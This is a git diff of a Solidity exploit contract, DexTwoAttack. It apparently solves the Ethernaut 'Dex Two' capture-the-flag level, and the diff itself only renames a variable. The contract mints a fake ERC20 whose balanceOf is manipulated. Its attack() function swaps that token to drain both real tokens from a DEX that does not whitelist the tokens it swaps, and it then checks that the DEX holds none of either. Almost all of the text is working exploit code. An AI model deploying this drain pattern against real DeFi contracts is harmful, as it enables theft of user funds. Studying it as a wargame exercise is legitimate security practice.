@@ -7,12 +7,12 @@ import "./interfaces/ISwappableTokenTwo.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
 contract DexTwoAttack is ERC20 {
-    IDexTwo private immutable victimDexTwo;
+    IDexTwo private immutable target;
 
-    constructor(IDexTwo victimDexTwo_) ERC20("DexTwo", "DT") {
-        _mint(address(this), victimDexTwo_.balanceOf(victimDexTwo_.token2(), address(victimDexTwo_)) * 2);
+    constructor(IDexTwo target_) ERC20("DexTwo", "DT") {
+        _mint(address(this), target_.balanceOf(target_.token2(), address(target_)) * 2);
 
-        victimDexTwo = victimDexTwo_;
+        target = target_;
     }
 
     function allowance(
@@ -25,19 +25,19 @@ contract DexTwoAttack is ERC20 {
     function balanceOf(
         address /* account */
     ) public view override returns (uint256) {
-        return victimDexTwo.balanceOf(victimDexTwo.token2(), msg.sender);
+        return target.balanceOf(target.token2(), msg.sender);
     }
 
     function attack() external {
         ISwappableTokenTwo[2] memory tokens = [
-            ISwappableTokenTwo(victimDexTwo.token1()),
-            ISwappableTokenTwo(victimDexTwo.token2())
+            ISwappableTokenTwo(target.token1()),
+            ISwappableTokenTwo(target.token2())
         ];
 
         for (uint256 i; i < tokens.length; ) {
-            victimDexTwo.swap(address(this), address(tokens[i]), tokens[i].balanceOf(address(victimDexTwo)));
+            target.swap(address(this), address(tokens[i]), tokens[i].balanceOf(address(target)));
 
-            require(0 == tokens[i].balanceOf(address(victimDexTwo)), "DexTwo: Attack failed");
+            require(0 == tokens[i].balanceOf(address(target)), "DexTwo: Attack failed");
 
             unchecked {
                 ++i;
